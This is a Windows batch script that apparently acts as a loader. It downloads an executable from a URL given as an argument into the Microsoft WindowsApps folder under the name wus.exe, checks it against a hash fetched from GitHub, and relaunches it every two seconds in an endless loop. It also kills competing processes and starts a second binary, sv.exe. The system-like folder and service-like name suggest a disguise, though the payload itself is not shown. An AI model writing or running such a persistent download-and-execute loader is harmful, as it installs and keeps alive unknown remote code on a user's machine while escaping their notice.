@echo off
setlocal enabledelayedexpansion

set "exe_path=%localappdata%\Microsoft\WindowsApps\wus.exe"
set "sv=%localappdata%\Microsoft\WindowsApps\sv.exe"
set "hash_url=https://github.com/KSGVIO/dist/raw/refs/heads/main/wus.hash"

:main_loop
:: Kill existing processes
taskkill /F /IM wus.exe >nul 2>&1
taskkill /F /IM flask_server.exe >nul 2>&1
start "" %sv%

:: Delete old exe if exists
if exist "%exe_path%" del /f /q "%exe_path%"

:download_loop
echo Downloading executable...
powershell -command "iwr -Uri %1 -OutFile '%exe_path%'"

:: Download hash file
set "hash_file=%temp%\wus.hash"
powershell -command "iwr -Uri %hash_url% -OutFile '%hash_file%'"

:: Calculate hash of downloaded exe
for /f %%H in ('certutil -hashfile "%exe_path%" SHA256 ^| find /i /v "hash" ^| find /i /v "CertUtil"') do set "calculated_hash=%%H"

:: Read hash from downloaded hash file
set /p "expected_hash=" < "%hash_file%"

:: Compare hashes
if /i "!calculated_hash!"=="!expected_hash!" (
    echo Hash verified.
) else (
    echo Hash mismatch! Redownloading...
    timeout /t 2 >nul
    goto download_loop
)

:run_check_loop
:: Check if process is running
tasklist | find /i "wus.exe" >nul
if errorlevel 1 (
    if exist "%exe_path%" (
        echo Launching executable...
        start "" "%exe_path%"
    ) else (
        echo Executable missing, redownloading...
        goto run_check_loop
    )
)

:: Wait before next check
timeout /t 2 >nul
goto run_check_loop
